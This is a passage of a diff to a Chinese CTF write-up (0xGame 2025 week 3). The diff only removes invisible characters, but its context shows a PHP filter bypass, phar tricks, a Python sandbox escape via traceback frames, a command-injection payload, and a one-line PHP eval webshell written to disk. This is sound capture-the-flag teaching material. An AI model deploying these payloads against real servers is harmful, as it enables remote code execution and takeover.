@@ -324,7 +324,7 @@ if(isset($_POST['file']))
 
 虽然过滤了很多函数但是我们慢慢看就会发现`shell_exec()`没被过滤
 
-然后我们看到`file_get_contents`​和`__HALT_COMPILER();`，一眼phar了
+然后我们看到`file_get_contents`和`__HALT_COMPILER();`，一眼phar了
 
 然后拿板子改
 
@@ -413,7 +413,7 @@ if __name__ == '__main__':
 
 ```
 
-我们能看到这里面的函数是被限制了的，只能使用 `print`​, `list`​, `len`​, `Exception` 四个函数
+我们能看到这里面的函数是被限制了的，只能使用 `print`, `list`, `len`, `Exception` 四个函数
 
 ```python
 whitelist = {
@@ -425,7 +425,7 @@ whitelist = {
     safe_globals = {"__builtins__": whitelist}
 ```
 
-栈帧逃逸的话，这里利用的是Exception（因为留了这个），我们先用`__traceback__.tb_frame`​来获取位置然后用`.f_back`回溯
+栈帧逃逸的话，这里利用的是Exception（因为留了这个），我们先用`__traceback__.tb_frame`来获取位置然后用`.f_back`回溯
 
 我们需要回溯到check路由，回溯路径的话就是
 
@@ -486,11 +486,11 @@ eval($cmd);
 ```
 
 php非法参数名传参解析  
-当`PHP版本小于8`​时，如果参数中出现中括号`[`​，中括号会被转换成下划线`_`​，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`​并不会继续转换成下划线`_`​，也就是说如果中括号`[`​出现在前面，那么中括号`[`​还是会被转换成下划线`_`​，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`
+当`PHP版本小于8`时，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，也就是说如果中括号`[`出现在前面，那么中括号`[`还是会被转换成下划线`_`，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`
 
 我们直接用`_[0xGame2025phpPsAux=system("ls /");`,发现flag,但是无法访问,猜是权限不够,我们写马连一下蚁剑
 
-​`_[0xGame2025phpPsAux=file_put_contents('1.php', '<?php @eval($_POST["cmd"]); ?>');`
+`_[0xGame2025phpPsAux=file_put_contents('1.php', '<?php @eval($_POST["cmd"]); ?>');`
 
 sudo没用我们看看ps -aux,发现start.sh有root权限,我们看看是啥玩意
 
@@ -498,7 +498,7 @@ sudo没用我们看看ps -aux,发现start.sh有root权限,我们看看是啥玩�
 
 ![a9e987a6-1532-4698-a9a0-db568d10295f](/img/0xgame2025-week3/a9e987a6-1532-4698-a9a0-db568d10295f-20251108230430-97uw0he.png)
 
-每 5 秒钟将 `/var/www/html/primary`​ 目录中的所有文件复制到 `/var/www/html/marstream/`​ 目录，并设置复制后文件的权限为 `755`
+每 5 秒钟将 `/var/www/html/primary` 目录中的所有文件复制到 `/var/www/html/marstream/` 目录，并设置复制后文件的权限为 `755`
 
 那我们
 
